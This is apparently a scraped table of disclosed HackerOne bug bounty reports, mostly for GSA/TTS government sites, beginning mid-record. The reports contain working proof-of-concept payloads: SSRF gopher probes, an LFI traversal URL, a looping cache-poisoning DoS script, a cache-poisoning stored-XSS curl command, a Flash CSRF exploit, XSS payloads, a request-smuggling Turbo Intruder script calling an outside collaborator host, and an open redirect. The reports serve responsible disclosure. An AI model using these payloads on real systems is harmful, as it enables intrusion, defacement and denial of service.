17<center><h1>504 Gateway Time-out</h1></center>
18<hr><center>nginx</center>
19</body>
20</html>
PORT 25  - open
https://labs.data.gov/dashboard/Campaign/json_status/gopher%3A%2F%2F127.0.0.1%3A25 - TIMEOUT
PORT 8080 - closed
https://labs.data.gov/dashboard/Campaign/json_status/gopher%3A%2F%2F127.0.0.1%3A8080 - 157 m/s response time
Read file from /root catalog README.md
In this usage of routes functionality we will present limited Local life inclusion, we escaped desired catalog ""documentation"" and called README.md, this vulnerability is limited due to "".md"" added to string function parameter at
https://github.com/GSA/project-open-data-dashboard/blob/master/application/controllers/Docs.php#L30
POC
read README.md from my root dir.
Code 54 BytesWrap lines Copy Download1https://labs.data.gov/dashboard/Docs/index/..%2fREADME
Function called ""Docs"" param $page = ..%2fREADME
This vuln is limited due to "".md"" hardcoded
Code 325 BytesWrap lines Copy Download1	public function index($page = 'main')
2	{
3
4		$data = array();
5
6		$docs_path = ($this->config->item('docs_path')) ? $this->config->item('docs_path') : 'https://raw.githubusercontent.com/GSA/project-open-data-dashboard/master/documentation/';
7		$docs_path = $docs_path	. $page . '.md';
8		$docs = @file_get_contents($docs_path);
Call other function not enabled in GUI
https://labs.data.gov/dashboard/user/metadata -> SAML Metadata clicking logo allow to find new components (https://labs.data.gov/dashboard/simplesaml/module.php/core/frontpage_welcome.php)
https://labs.data.gov/dashboard/user/acs -> stack traces enabled
Impact
Call not available from GUI Function that may lead to critical problems.7 attachments:F862987: ssrf_request_on_our_vps.pngF862988: gopher_enabled.pngF862989: gopher_call_request.pngF862990: LFI_limited.pngF862991: other1.pngF862992: other2.pngF862997: other3.png",https://hackerone.com/reports/895696,New South Wales,Australia,Sydney,2020,6,10,22,8
GSA Bounty,11-50,0.0,1m-10m,$750.00,High,7.5,Violation of Secure Design Principles,Cache poisoning DoS to various TTS assets,"nathand  submitted a report to GSA Bounty.Nov 4th (3 years ago)I have recently come across a technique to force a Cloudfoundry app to return a HTTP 404 error when requesting any resource, which contains cache friendly headers. What this means is, if the Cloudfoundry app in question is behind a web cache like Cloudfront or Cloudflare etc, it will possibly store a copy of the 404 error response as the cache for the resource being requested, which is served to other users. This describes a cache poisoning Denial of Service, and the concept for this is detailed at https://cpdos.org.
The technique to achieve CPDoS against a Cloudfoundry and hence TTS app is to send a request with the following header:
Code 17 BytesWrap lines Copy Download1X-CF-APP-INSTANCE
This header is designed to allow admins to debug CF apps, by choosing which app instance they want serving their request. However, if we supply this header with a bad value, it will force the gorouter in the Cloudfoundry stack to issue a HTTP 404, e.g.:
Code 24 BytesWrap lines Copy Download1X-CF-APP-INSTANCE: xxx:1
Please note: I have already reported this to Pivotal/Cloudfoundry by contacting their security email address directly. They have not yet confirmed the vulnerability, although I'm fairly confident the issue exists in gorouter. However, I thought it relevant to report this to you regardless, as you should be able to mitigate this vulnerability without waiting for Pivotal to release an update for gorouter, by configuring your web caches/WAFs appropriately (don't cache 404's, strip out this header etc). With that said, I understand if this report is not valid due to this - if this is the case, a heads up so I can close it from my end would be appreciated.
The following assets appear to be vulnerable:
Code 58 BytesWrap lines Copy Download1analytics.usa.gov
2federation.data.gov
318f.gsa.gov
4code.gov
Please note that this is not an exhaustive list as I did not test against every asset in scope, however I did attempt the poisoning against login.gov and did not succeed, which I suspect might be because login.gov is specifically configured not to cache 404 errors. With that said, the config for login.gov may provide a means to protect the above listed assets and others that may be vulnerable.
Proof of concept
To poison the cache for a resource, the following script can be used - in this case, https://federation.data.gov/?cb=xxx is being poisoned to serve a 404 error to other users. Please note the presence of the ?cb=xxx query string - this is designed to be a ""cache buster"", to prevent poisoning the real home page. You may need to change the cache buster value to avoid hitting a previous successful cached copy.
Code 440 BytesWrap lines Copy Download1#!/bin/bash
2
3while true
4do
5    printf 'GET /?cb=xxx HTTP/1.1\r\n'\
6'Host: federation.data.gov\r\n'\
7'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:70.0) Gecko/20100101 Firefox/70.0\r\n'\
8'Accept: */*\r\n'\
9'Accept-Language: en-US,en;q=0.5\r\n'\
10'Accept-Encoding: gzip, deflate\r\n'\
11'X-CF-APP-INSTANCE: xxx:1\r\n'\
12'Connection: close\r\n'\
13'\r\n'\
14    | openssl s_client -ign_eof -connect federation.data.gov:443
15    sleep 1
16done
(FYI the poisoning script can probably sleep longer than 1 second - this is just to make sure the poisoning takes effect)
You should see 404 errors being returned in this script's output. Because the web cache appears to key on Cookie header values, this will only poison the cache for users without a pre-existing cookie for the domain (i.e. new users). This can be demonstrated by the following curl command (or by accessing the resource in a private browser window session without pre-existing cookies):
Code 167 BytesWrap lines Copy Download1curl -i -s -k -X $'GET' \
2    -H $'Host: federation.data.gov' -H $'Accept-Encoding: gzip, deflate' -H $'Connection: close' \
3    $'https://federation.data.gov/?cb=xxx'
If there are specific resources and assets which don't key cache on cookie headers, then these will probably be easier to exploit against more users. 
In this asset's case, the error will be:
Code 104 BytesWrap lines Copy Download1404 Not Found: Requested route ('cg-06ab120d-836f-49a2-bc22-9dfb1585c3c6.app.cloud.gov') does not exist.
A bonus here is this error reveals an ""internal"" hostname otherwise not accessible to an attacker.
Given the assets all appear to use Cloudfront for caching, it is true that the poisoning will be regional - however, it is fairly trivial to acquire VPS' around the world (or perhaps just around the US in this case) to poison specific regions, and using a tool like https://www.nexcess.net/web-tools/dns-checker/, an attacker may be able to determine regional IPs for the asset, and poison regions by directly targeting them (not confirmed - I was aware of a technique to do this but was unable to confirm this).
One thing I did notice is these poisoning attacker requests may not hit the app logs in Cloudfoundry, e.g. the cf logs APP_NAME output, since it errors at the gorouter. If you have app logging dependent on displaying what is visible in the CF app logs, it may not detect these attacks.
Impact
By exploiting this vulnerability, an attacker may be able to achieve denial of service for various TTS assets, particularly to new users.",https://hackerone.com/reports/728664,New South Wales,Australia,Sydney,2019,11,4,7,36
GSA Bounty,11-50,0.0,1m-10m,"$2,000.00",Critical,9.0,Improper Access Control - Generic,CI for [example.gov] can be logged in and accessible,kunal94  submitted a report to GSA Bounty.Feb 1st (5 years ago),https://hackerone.com/reports/311289,New South Wales,Australia,Sydney,2018,2,1,8,28
GSA Bounty,11-50,0.0,1m-10m,$300.00,Medium,5.45,Cross-Site Request Forgery (CSRF),"Cross-Site Request Forgery on the Federalist API (all endpoints), using Flash file on the attacker's host","sp1d3rs  submitted a report to GSA Bounty.Aug 26th (5 years ago)Summary by sp1d3rsThanks to the 18F team for the great experience, fast fix, and the bounty!
The report details (i requested the limited disclosure due to lot of sensitive info in the attachments and report itself, and possibility to use a Summary as a kind of structured write-up):
Hello. At the beginning of my work with TTS Bug Bounty program, I noticed, that Federalist API does not have any CSRF protection - but was unable to make proper POC, since data had JSON format, and the Content-Type header was correctly checked.
However, I was able to forge valid Content-Type header using flash file now, after reading some articles of other researchers.
I recommend to read this article first to fully understand the issue:
http://www.geekboy.ninja/blog/exploiting-json-cross-site-request-forgery-csrf-using-flash/
http://resources.infosecinstitute.com/bypassing-csrf-protections-fun-profit/#gref
It means that JSON data without any CSRF protection is not so safe, as supposed to be.
Why it works
To clarify, the SOP/CORS are failing in the case of 307 redirect trick (due to that fact, that during 307 redirect crossdomain.xml on the target host will be called after the POST request for some reason - so POST request will reach the destination), and can only prevent the response reading by the Flash application, but not prevent the CSRF attack itself (it can be the Flash fault, or the way how the browsers are handling 307 redirects of the requests, initialized by Flash applications).
So it does not actually matter, does Access-Control-Allow-Origin header exist or not on the target host (Flash ignores it), same as crossdomain.xml.
Tested HTTP methods on Federalist API:
GET - CSRF possible
POST - CSRF possible
PUT - CSRF not possible
DELETE - CSRF not possible
POC
You can use live POC (host was redacted in this Summary due to security reasons 【ツ】):
Code 140 Bytes1http://[REDACTED]/test.swf?jsonData={""site"":1,""branch"":""master""}&php_url=http://[REDACTED]/test.php&endpoint=http://localhost:1337/v0/build/
You can specify the jsonData (for example, if you need to change siteID param), and endpoint by different Federalist endpoint (in case you are testing not on the localhost)
This POC will work on the Federalist staging site:
Code 149 Bytes1http://[REDACTED]/test.swf?jsonData={""site"":1,""branch"":""master""}&php_url=http://[REDACTED]/test.php&endpoint=https://federalist.fr.cloud.gov/v0/build
and this will work on the Federalist production site:
Code 144 Bytes1http://[REDACTED]/test.swf?jsonData={""site"":1,""branch"":""master""}&php_url=http://[REDACTED]/test.php&endpoint=https://federalist.18f.gov/v0/build
The only conditions for this:
1) Flash must be enabled in the browser.
2) User must be logged in.
3) User must have access to the site with ID 1.
In other case, change the payload from
Code 28 Bytes1{""site"":1,""branch"":""master""}
to
Code 54 Bytes1{""site"":[siteID you have access to],""branch"":""master""}
for successful testing.
The SWF file will send JSON data to the http://[REDACTED]/test.php, which then will be 307-redirected to the Federalist with correct Content-Type.
The result will be restarting the build of the site with ID 1 (if exist, and the current user is the owner).
On the screen below I did this with site ID 35 on my test instance.
[SCREENS REMOVED]
Reproduction steps:
If you want to reproduce it on your own servers, you need the host, specially crafted SWF file, PHP file with 307 redirect, and crossdomain.xml file (in case PHP and SWF files are not on same-origin). It should also work locally.
I created GitHub repo to simplify the CSRF testing process:
https://github.com/sp1d3r/swf_json_csrf
Impact
The attacker can call any POST API action on behalf of Federalist user, who will visit the specially crafted page with SWF file. The attacker can trigger the build, add the site (if the repository name is known), etc - basically, all possible POST API actions which the user can do. Still, because the attacker does not know private repo names - he can't easily do the worst actions, so this issue has Medium impact.
Suggested fix
The fix can actually be the one of (order is determined by safety):
1) Implementing anti-CSRF tokens protection (header-based). [This one was chosen as fix]
2) Switching the POST method on the API endpoints to the PUT- we can leave GET API endpoints as is, because these endpoints are only informational, and their responses can't be read by the Flash application - so I think we are safe here, and JSON Hijacking is not possible for now (if no bypass will be discovered).
3) Check the Referer/Origin header - at this moment we can't set arbitrary headers using Flash - so it can be considered as the fix too.
However, due to weird things discovered on regular basis with Flash - all can happen in the future.
References

Special thanks to the @emgeekboy and his blogpost:
http://www.geekboy.ninja/blog/exploiting-json-cross-site-request-forgery-csrf-using-flash/
https://hackerone.com/reports/44146 by @avlidienbrunn
http://www.appsecweekly.com/flash-same-origin-policy-bypass-with-307/
http://research.rootme.in/forging-content-type-header-with-flash/
http://resources.infosecinstitute.com/bypassing-csrf-protections-fun-profit/#gref
https://github.com/sp1d3r/swf_json_csrf - SWF JSON CSRF exploitation tool
Show more",https://hackerone.com/reports/263662,New South Wales,Australia,Sydney,2017,8,26,18,18
GSA Bounty,11-50,0.0,1m-10m,$750.00,High,8.6,Cross-site Scripting (XSS) - Stored,Defacement of catalog.data.gov via web cache poisoning to stored DOMXSS,"albinowax  submitted a report to GSA Bounty.Jan 10th (5 years ago)An attacker can deface various pages on catalog.data.gov, leading to them executing malicious JavaScript when visited by a normal user.
The root problem is that the server trusts the X-Forwarded-Host HTTP header, and uses this to populate the 'data-site-root' and 'data-locale-root' attributes on the <body tag. Some JavaScript then fetches a JSON file from the URL specified in these attributes, and writes the response to the page without escaping it, leading to a DOMXSS vulnerability.
This behaviour is harmless by itself, since I can't make a victim send a malicious HTTP header. Fortunately for me, I can ensure that the poisoned response sent to me is cached by CloudFront, meaning my payload will be served to loads of other users. 
Please be careful when exploring this issue, as it's potentially quite easy to accidentally poison CloudFront's cache and antagonise your visitors. To safely replicate this issue, you can use the following steps:


Run curl command to poison cache:
curl -i -s -k  -X $'GET' \
-H $'Host: catalog.data.gov' -H $'Accept-Encoding: gzip, deflate' -H $'Accept: /' -H $'Accept-Language: en' -H $'User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)' -H $'x-forwarded-host: portswigger-labs.net/catalog.data.gov_json_xss/json.php?' -H $'Connection: close' \
$'https://catalog.data.gov/dataset/consumer-complaint-database?dontpoisoneveryone=6' > /dev/null


Visit the poisoned page:
https://catalog.data.gov/dataset/consumer-complaint-database?dontpoisoneveryone=6


Wait for a few seconds, and observe the popup caused by our injected alert(document.domain)


Behind the scenes, step 1 poisons the cache with a data-site-root value of 'portswigger-labs.net/catalog.data.gov_json_xss/json.php'. In step 2, some JavaScript fetches our json.php file from portswigger-labs.net, and uses our 'show more' JSON attribute to translate the 'show more' text on https://catalog.data.gov/dataset/consumer-complaint-database into ""Mostrar más <svg onload=alert(document.domain)>""
This is the offending line of JavaScript:
var template_more = ['<tr class=""toggle-show toggle-show-more"">', '<td colspan=""' + cols + '"">', '<small>', '<a href=""#"" class=""show-more"">' + this.i18n('show_more') + '</a>', '<a href=""#"" class=""show-less"">' + this.i18n('show_less') + '</a>', '</small>', '</td>', '</tr>'].join('\n');
To mitigate this issue, I recommend addressing the X-Forwarded-Host reflection. 
Please let me know if you have any questions.
Cheers,
James & Gareth
Impact
An attacker can deface most pages on catalog.data.gov.2 attachments:F252795: Screen_Shot_2018-01-10_at_12.11.01.pngF252796: Screen_Shot_2018-01-10_at_12.13.45.png",https://hackerone.com/reports/303730,New South Wales,Australia,Sydney,2018,1,10,12,23
GSA Bounty,11-50,0.0,1m-10m,$300.00,Medium,5.45,Cross-site Scripting (XSS) - Stored,Double Stored Cross-Site scripting in the admin panel,"sp1d3rs  submitted a report to GSA Bounty.Jul 1st (5 years ago)Description
Hello. I discovered a Stored XSS attack vector in the Custom Domain field
POC & Reproduction steps

Login to the federalist and go to the some instance http://localhost:1337/sites/<siteid>/settings
Fill the Custom Domain field by the

Code 33 BytesWrap lines Copy Download1javascript:alert(document.domain)
and Demo domain
Code 34 BytesWrap lines Copy Download1javascript:alert(document.domain);
(it cannot be the same so we bypass the check by adding ;)

Save and press View Website button. You will be XSSed.
Image F199337: test2s.PNG 158.50 KiBZoom in Zoom out Copy Download
Image F199336: test3.PNG 34.27 KiBZoom in Zoom out Copy Download
4) Go to the http://localhost:1337/sites/<siteid>/published - and press view on the demo site to test second Stored XSS
Image F199338: test23.PNG 89.65 KiBZoom in Zoom out Copy Download

The impact
The XSS requires user interaction (e.g. clicking the button). But still, it is a bad thing. Anyone who gain access here, can conduct stored XSS attack against other admins.
The root cause & suggested fix
The input fields not sanitized properly - it should allow only alphanumeric characters, and dots.3 attachments:F199336: test3.PNGF199337: test2s.PNGF199338: test23.PNGSummary by sp1d3rsThanks to the 18F team for the great experience, fast fix and the bounty!
This report describes two simple stored XSS vectors in the Federalist control panel using pseudoprotocols like javascript:
Issue was fixed by implementing URL validation.
References
Running Federalist locally",https://hackerone.com/reports/245172,New South Wales,Australia,Sydney,2017,7,1,20,3
GSA Bounty,11-50,0.0,1m-10m,$900.00,Medium,5.45,Cross-site Scripting (XSS) - Reflected,HTML injection (with XSS possible) on the https://www.data.gov/issue/ using media_url attribute,"sp1d3rs  submitted a report to GSA Bounty.Aug 25th (5 years ago)Description
Hello. I discovered Cross-Site scripting issue on the https://www.data.gov/issue/ endpoint.
Akamai WAF and bypass
At the srart i was not able to do the XSS due to Akamai Waf XSS filters, but later, i was able to bypass it.
POC (HTML injection)
https://www.data.gov/issue/?media_url=catalog.data.gov/dataset/consumer-complaint-database%22%3E%3Csvg%20height=%22100%22%20width=%22100%22%3E%20%3Ccircle%20cx=%2250%22%20cy=%2250%22%20r=%2240%22%20stroke=%22black%22%20stroke-width=%223%22%20fill=%22red%22%20/%3E%20%3C/svg%3E
Image F215755: c.PNG 16.03 KiBZoom in Zoom out Copy Download
POC (Reflected XSS)
Use this link in the Mozilla Firefox
https://www.data.gov/issue/?media_url=catalog.data.gov/dataset/consumer-complaint-database%22%3E%3C/div%3E%3C/div%3E%3Cbrute%20onbeforescriptexecute=%27confirm(document.domain)%27%3E
Image F215768: cx.PNG 15.43 KiBZoom in Zoom out Copy Download
Suggested fix
Sanitize all input fields on this page. 2 attachments:F215755: c.PNGF215768: cx.PNGSummary by sp1d3rsThanks to the 18F team for the great experience, fast fix, and the bounty!
This XSS was undetectable by the most XSS scanners due to WAF in place. I noticed the reflection upon exploring the huge list of URLs (grabbed from the Google Search) manually. The WAF bypassing was an actual pain - it blocked almost all (but not all!) useful things (tags, events, etc.).
There were 3 endpoints in total, affected by this issue.
References
Thanks to the @brutelogic and his awesome filter and WAF evasion tips on the @brutalsecrets - one of those tips helped me to bypass the Kona WAF after 6 hrs of pain.
You may notice, that I even used the brute tag in the payload:)",https://hackerone.com/reports/263226,New South Wales,Australia,Sydney,2017,8,25,13,33
GSA Bounty,11-50,0.0,1m-10m,$750.00,High,7.7,HTTP Request Smuggling,HTTP Request Smuggling on https://labs.data.gov,"puppykok  submitted a report to GSA Bounty.Oct 31st (3 years ago)Greetings,
The application appears to be vulnerable to HTTP request smuggling due to a disagreement between the front-end and back-end server, where the front-end server uses the Transfer-Encoding header to determine content in the HTTP body, but back-end server uses the Content-Length header, which causes a desync. The following steps outline how to reproduce this vulnerability:
The purpose of the following Turbo Intruder script is to send a desync request followed by 14 requests in quick succession to increase the chances of catching the desync-ed request such that it would not poison the request of another user who happens to be browsing the page.
Code 1.22 KiBWrap lines Copy Download1import re
2
3def queueRequests(target, wordlists):
4
5    # to use Burp's HTTP stack for upstream proxy rules etc, use engine=Engine.BURP
6    engine = RequestEngine(endpoint=target.endpoint,
7                           concurrentConnections=5,
8                           requestsPerConnection=1,
9                           resumeSSL=False,
10                           timeout=10,
11                           pipeline=False,
12                           maxRetriesPerRequest=0,
13                           engine=Engine.THREADED,
14                           )
15    engine.start()
16
17    prefix = '''POST /hopefully404 HTTP/1.1
18Host: o0p31lhhe946t0sns65oy4vsejkb80.burpcollaborator.net
19Content-Type: application/x-www-form-urlencoded
20Content-Length: 15
21
22x=1'''
23
24    chunk_size = hex(len(prefix)).lstrip(""0x"")
25    attack = target.req.replace('0\r\n\r\n', chunk_size+'\r\n'+prefix+'\r\n0\r\n\r\n')
26    content_length = re.search('Content-Length: ([\d]+)', attack).group(1)
27    attack = attack.replace('Content-Length: '+content_length, 'Content-length: '+str(int(content_length)+len(chunk_size)-3))
28    engine.queue(attack)
29
30    for i in range(14):
31        engine.queue(target.req)
32        time.sleep(0.05)
33
34
35def handleResponse(req, interesting):
36    table.add(req)
The following desync request issued to the server is shown below, where I changed the host header to my Burp's collaborator domain:
Code 512 BytesWrap lines Copy Download1POST / HTTP/1.1
2Host: labs.data.gov
3Accept-Encoding: gzip, deflate
4Accept: */*
5Accept-Language: en
6User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36
7Connection: keep-alive
8Content-Type: application/x-www-form-urlencoded
9Content-length: 4
10Transfer-Encoding : chunked
11
12a2
13POST /hopefully404 HTTP/1.1
14Host: o0p31lhhe946t0sns65oy4vsejkb80.burpcollaborator.net
15Content-Type: application/x-www-form-urlencoded
16Content-Length: 15
17
18x=1
190
From the following screenshot, you can see that a 'victim' request was caught which redirected to a 404 page, just as intended, since https://www.data.gov/hopefully404 does not actually exist. In addition, by searching for my Burp's collaborator URL, you can see that there are 67 instances where the URL is reflected, some within script tags and sources:
Image F622456: turbo1.png 87.58 KiBZoom in Zoom out Copy Download
The following request is heavily shortened to show that the attacker's host URL is reflected in multiple critical areas within the victim's response:
Code 2.96 KiBWrap lines Copy Download1-snip
2<script type='application/ld+json' class='yoast-schema-graph yoast-schema-graph--main'>{""@context"":""https://schema.org"",""@graph"":[{""@type"":""WebSite"",""@id"":""https://o0p31lhhe946t0sns65oy4vsejkb80.burpcollaborator.net/#website"",""url"":""https://o0p31lhhe946t0sns65oy4vsejkb80.burpcollaborator.net/"",""name"":""Data.gov"",""potentialAction"":{""@type"":""SearchAction"",""target"":""https://o0p31lhhe946t0sns65oy4vsejkb80.burpcollaborator.net/?s={search_term_string}"",""query-input"":""required name=search_term_string""}}]}</script>
3<!-- / Yoast SEO plugin. -->
4
5-snip-
6
7<link rel=""stylesheet"" href=""https://o0p31lhhe946t0sns65oy4vsejkb80.burpcollaborator.net/app/plugins/simple-tooltips/zebra_tooltips.css?ver=5.2.4"">
8<link rel=""stylesheet"" href=""https://o0p31lhhe946t0sns65oy4vsejkb80.burpcollaborator.net/app/plugins/the-events-calendar/common/src/resources/css/reset.min.css?ver=4.9.16"">
9<link rel=""stylesheet"" href=""https://o0p31lhhe946t0sns65oy4vsejkb80.burpcollaborator.net/app/plugins/the-events-calendar/common/src/resources/css/common.min.css?ver=4.9.16"">
10<link rel=""stylesheet"" href=""https://o0p31lhhe946t0sns65oy4vsejkb80.burpcollaborator.net/app/plugins/the-events-calendar/common/src/resources/css/tooltip.min.css?ver=4.9.16"">
11<link rel=""stylesheet"" href=""https://o0p31lhhe946t0sns65oy4vsejkb80.burpcollaborator.net/wp/wp-includes/css/dist/block-library/style.min.css?ver=5.2.4"">
12
13-snip-
14
15<a class=""dropdown-toggle local-link"" data-toggle=""dropdown"" data-target=""#"" href=""https://o0p31lhhe946t0sns65oy4vsejkb80.burpcollaborator.net/communities/"">Topics <b class=""caret""></b></a>
16<ul class=""dropdown-menu topics"">
17	<li class=""menu-agriculture topic-food""><a href=""https://o0p31lhhe946t0sns65oy4vsejkb80.burpcollaborator.net/food/"" class=""local-link""><i></i><span>Agriculture</span></a></li>
18	<li class=""menu-climate topic-climate""><a href=""https://o0p31lhhe946t0sns65oy4vsejkb80.burpcollaborator.net/climate/"" class=""local-link""><i></i><span>Climate</span></a></li>
19	<li class=""menu-consumer topic-consumer""><a href=""https://o0p31lhhe946t0sns65oy4vsejkb80.burpcollaborator.net/consumer/"" class=""local-link""><i></i><span>Consumer</span></a></li>
20	<li class=""menu-ecosystems topic-ecosystems""><a href=""https://o0p31lhhe946t0sns65oy4vsejkb80.burpcollaborator.net/ecosystems/"" class=""local-link""><i></i><span>Ecosystems</span></a></li>
21	<li class=""menu-education topic-education""><a href=""https://o0p31lhhe946t0sns65oy4vsejkb80.burpcollaborator.net/education/"" class=""local-link""><i></i><span>Education</span></a></li>
22	<li class=""menu-energy topic-energy""><a href=""https://o0p31lhhe946t0sns65oy4vsejkb80.burpcollaborator.net/energy/"" class=""local-link""><i></i><span>Energy</span></a></li>
23	<li class=""menu-finance topic-finance""><a href=""https://o0p31lhhe946t0sns65oy4vsejkb80.burpcollaborator.net/finance/"" class=""local-link""><i></i><span>Finance</span></a></li>
24	<li class=""menu-health topic-health""><a href=""https://o0p31lhhe946t0sns65oy4vsejkb80.burpcollaborator.net/health/"" class=""local-link""><i></i><span>Health</span></a></li>
Note that this attack is not reliable and we may fail to 'catch on' to the victim's request which might inadvertently affect an innocent user. During testing, there was one such case of this happening and the Burp Collaborator manages to posion someone from Los Angeles, California:
Image F622459: turbo2.png 11.08 KiBZoom in Zoom out Copy Download
Image F622460: turbo3.png 21.79 KiBZoom in Zoom out Copy Download
In order to prevent affecting more innocent users, I stopped further testing after coming with the above proof of concept which should be sufficent to proof the existence of the vulnerability. Please let me know if any additional information is needed and I will gladly provide.
Impact
Since the javascript imports on the page can be determined by the attacker, he can host a malicious domain to steal user data, perform stored cross-site scripting and defacing the webpage for the user whos request was poisoned by the desynced request. In addition, I noticed there was a Wordpress login page but seems like it requires a specially-configured browser to access the SSO. My suspicion is that it is very likely that an attacker can steal authenticated cookies/headers which will be sent to an attacker-controlled server, although I am unable to verify (Can't get SSO to work on my browser).3 attachments:F622456: turbo1.pngF622459: turbo2.pngF622460: turbo3.png",https://hackerone.com/reports/726773,New South Wales,Australia,Sydney,2019,10,31,16,18
GSA Bounty,11-50,0.0,1m-10m,$150.00,Low,2.0,Information Disclosure,Information disclosure (system username) in the x-amz-meta-s3cmd-attrs response header on federation.data.gov,"sp1d3rs  submitted a report to GSA Bounty.Aug 23rd (5 years ago)Description
Hi. I just noticed, that you are extended the scope for the bounty program. I looked to the first resource - 
Code 28 BytesWrap lines Copy Download1https://federation.data.gov/
I noticed, that the x-amz-meta-s3cmd-attrs response header returns sensitive information, like system username:
Code 155 BytesWrap lines Copy Download1x-amz-meta-s3cmd-attrs:uid:0/gname:root/uname:root/gid:0/mode:33188/mtime:1482273904/atime:1482273904/md5:c9d60fd5a46044f7c58684a6c701ce54/ctime:1482273904
Image F215241: cxz.PNG 90.89 KiBZoom in Zoom out Copy Download
Impact
The attacker can gain sensitive information about system username. In this case it was root, so i marked impact as Low. Still, the developers can have a good reason to not expose this information in the response header.
Suggested fix
I found the related article, written by other researcher:
https://medium.com/@arbazhussain/username-disclose-at-s3-balsamiq-d98336d4012d
and issue in the s3cmd repository: https://github.com/s3tools/s3cmd/issues/67
where sugested fix is adding the -- no-preserve comand.1 attachment:F215241: cxz.PNGSummary by sp1d3rsThanks to the 18F team for the great experience, fast fix and the bounty!
It was a very simple finding - required only looking to the Response headers of the site. The issue classified as best-practice, because exposed username was default.
References
After discovering the issue, i googled it, and found that Arbaz Hussain already highlighted this issue here:
https://medium.com/@arbazhussain/username-disclose-at-s3-balsamiq-d98336d4012d",https://hackerone.com/reports/262649,New South Wales,Australia,Sydney,2017,8,23,18,10
GSA Bounty,11-50,0.0,1m-10m,$300.00,Medium,5.5,Remote File Inclusion,Limited LFI,"mariuszpoplawski  submitted a report to GSA Bounty.Jun 11th (2 years ago)Summary:
Due to improper parameter sensitization  local file inclusion is possible. LFI is limited as we were not able to truncate the end of string.
Description:
Application root is located at
/var/www/dashboard/new/public
Due to URL Manipulation we are able to raed file from
/var/www/dashboard/new/
Which should not be allowed.
Below we present function Index in Docs class -> parameter $page is set in URL  in below example ""..%2fREADME""
Path is constructed as follow $docs_path = $docs_path . $page . '.md'; then file is read in file_get_contents and returned in application GUI.
LFI is limited due to  "" . '.md';"" part, but may be bypassed in futures, we have not found a way to bypass it thats why the risk was set to low. In case of bugs combination , PHP bugs etc.. in future this may be escalated. User should  not control any part of ""file_get_contents"" function
Code 352 BytesWrap lines Copy Download1 public function index($page = 'main')
2    {
3
4        $data = array();
5
6        $docs_path = ($this->config->item('docs_path')) ? $this->config->item('docs_path') : 'https://raw.githubusercontent.com/GSA/project-open-data-dashboard/master/documentation/';
7        $docs_path = $docs_path . $page . '.md';
8        $docs = @file_get_contents($docs_path);
Steps To Reproduce:

Read file from main root by calling URL:
https://labs.data.gov/dashboard/Docs/index/..%2fREADME

POC
File README.md not exists in our current dir.
Zrzut_ekranu_2020-06-11_o_12.36.29.png (F863983)
File README.md can be read due to LFI
https://labs.data.gov/dashboard/Docs/index/..%2fREADME
Zrzut_ekranu_2020-06-11_o_12.37.51.png (F863984)
Confirmation:
File exact as:
https://github.com/GSA/project-open-data-dashboard/blob/master/README.md
Impact
User have ability to control part of @file_get_contents function. This type of usage may lead to critical file read. In this scenario, we did not bypass the hardcoded ext so files was limited to "".md"" and low risk was set.  This should be corrected in case of future PHP bugs, if attacker will truncate the .ext part any file read will be allowed.2 attachments:F863983: Zrzut_ekranu_2020-06-11_o_12.36.29.pngF863984: Zrzut_ekranu_2020-06-11_o_12.37.51.png",https://hackerone.com/reports/895972,New South Wales,Australia,Sydney,2020,6,11,10,43
GSA Bounty,11-50,0.0,1m-10m,$150.00,Low,3.8,Open Redirect,[idp.fr.cloud.gov] Open Redirect,"bobrov  submitted a report to GSA Bounty.Jul 26th (4 years ago)Description: Open Redirect
Domain: idp.fr.cloud.gov
Steps To Reproduce:
Open URL:
Code 45 BytesWrap lines Copy Download1https://idp.fr.cloud.gov//blackfan.ru/..;/css
HTTP Response
Code 59 BytesWrap lines Copy Download1HTTP/1.1 302 Found
2...
3Location: //blackfan.ru/..;/css/
4...
Impact
A web application accepts a user-controlled input that specifies a link to an external site, and uses that link in a Redirect. This simplifies phishing attacks.",https://hackerone.com/reports/387007,New South Wales,Australia,Sydney,2018,7,26,4,18
h1-ctf,251-500,1.0,No value,$100.00,Critical,9.5,SQL Injection,100K CTF's Writeup,"dexter0us  submitted a report to h1-ctf.Jun 3rd (about 1 year ago)Summary by dexter0usHello everyone,
We are one of the winners of 100k CCC CTF and we would like to congratulate all the other winners of the CTF as well.
Here is the link to our write-up https://blog.dexter0us.com/posts/ccc-h1ctf/ hope you guys enjoy reading it and learn something new from it. 
:)",https://hackerone.com/reports/1216591,No value,No value,No value,2021,6,3,15,42
h1-ctf,251-500,1.0,No value,$100.00,No value,0.0,None,[100K-ctf] Multiple vulnerabilities leading to compromise of Pinger instance.,"nukedx  submitted a report to h1-ctf.Jun 2nd (about 1 year ago)Hello,
Gonna just submit flags first then will send my write up later tomorrow.
████
██████
Thanks for fun!
Impact
An attacker can compromise Pinger instance located on https://ccc.h1ctf.com/2b5d2b11513d2c9b by chaining multiple vulnerabilities on https://ccc.h1ctf.com/.Summary by nukedxWrite up for the CTF can be found on: https://nukedx.com/ccc-designs-pentest.pdf",https://hackerone.com/reports/1215867,No value,No value,No value,2021,6,2,22,9
HackerOne,1001-5000,0.0,10m-50m,"$20,000.00",High,8.3,Improper Authentication - Generic,Account takeover via leaked session cookie,"haxta4ok00  submitted a report to HackerOne.Nov 24th (3 years ago)Summary:
You are disclose for me you session
Description:
you are gevi me your session on last report
I am can use your session(sorry)
███
████████
█████████
Impact
HackerOneStaff Access, i can read all reports @security and more program",https://hackerone.com/reports/745324,California,United States,San Francisco,2019,11,24,13,8
HackerOne,1001-5000,0.0,10m-50m,$500.00,Low,3.8,Business Logic Errors,Getting New Invitations without Leaving Programs,"ali  submitted a report to HackerOne.Oct 6th (2 years ago)Hello there,
I hope all is well!
Description
When you leave the private program, you get a chance to get a new invitation.
But using this vulnerability, I can get new invitations without leaving private programs.
Steps:

Go to any private bug bounty program.
Click Leave Program button
Click Confirm button
Then you will see a questionnaire form. You can see this text: When you fill out this questionnaire, we will fast track you for the next invite batch.
Image F1022548: 1.png 24.29 KiBZoom in Zoom out Copy Download
Click any reason (for example: Unresponsive) and click Submit button
Return to Burp Suite and catch the request:
Image F1022553: 2.png 96.04 KiBZoom in Zoom out Copy Download
Now, send the request to Repeater and forward the request.
Go to repeater and change the team_handle parameter with another private program handle which you have.
